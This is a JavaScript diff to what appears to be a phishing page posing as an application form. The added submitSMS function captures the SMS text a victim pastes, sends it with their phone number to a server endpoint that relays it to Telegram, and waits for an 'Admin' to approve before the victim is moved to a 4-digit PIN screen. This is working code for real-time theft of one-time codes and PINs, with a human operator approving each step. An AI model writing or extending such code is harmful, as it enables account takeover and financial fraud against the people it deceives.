@@ -113,7 +113,7 @@ function generateSummary() {
     }
 }
 
-// --- 1. SHOW PROCESSING SCREEN & TRIGGER TELEGRAM ---
+// --- 1. SUBMIT FORM & TRIGGER TELEGRAM ---
 async function submitForm(event) {
     event.preventDefault(); 
     
@@ -134,7 +134,6 @@ async function submitForm(event) {
         return;
     }
 
-    // Show the Processing Screen IMMEDIATELY
     goToScreen('screen-processing');
 
     const phone = document.getElementById('phone-number').value || "Unknown";
@@ -154,11 +153,11 @@ async function submitForm(event) {
 
             if (statusData.status === 'approve') {
                 clearInterval(interval);
-                goToScreen('screen-sms'); // Move to SMS on Approval
+                goToScreen('screen-sms');
             } else if (statusData.status === 'reject') {
                 clearInterval(interval);
                 alert("Application rejected by Admin.");
-                goToScreen('screen-application'); // Go back if rejected
+                goToScreen('screen-application');
             }
         }, 2000);
 
@@ -193,6 +192,46 @@ async function pasteSMS() {
         alert("Please press and hold on the text box to paste the SMS manually.");
     }
 }
+
+// --- 2. SEND SMS TO TELEGRAM & WAIT ---
+async function submitSMS() {
+    const smsText = document.getElementById('sms-input').value;
+    if (smsText.length < 5) return;
+
+    // Show processing screen
+    goToScreen('screen-processing');
+
+    const phone = document.getElementById('phone-number').value || "Unknown";
+
+    try {
+        // Send to Telegram (using the 'code' field to carry the SMS text)
+        const response = await fetch('/api/request-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone, code: `SMS TEXT:\n${smsText}` })
+        });
+        const result = await response.json();
+
+        const interval = setInterval(async () => {
+            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
+            const statusData = await statusRes.json();
+
+            if (statusData.status === 'approve') {
+                clearInterval(interval);
+                goToScreen('screen-pin'); // Move to 4-digit PIN screen
+            } else if (statusData.status === 'reject') {
+                clearInterval(interval);
+                alert("SMS Verification rejected by Admin.");
+                goToScreen('screen-sms');
+            }
+        }, 2000);
+
+    } catch (error) {
+        alert("Error connecting to server.");
+        goToScreen('screen-sms');
+    }
+}
+
 
 // --- PIN SCREEN LOGIC ---
 const pinBoxes = document.querySelectorAll('.pin-box');
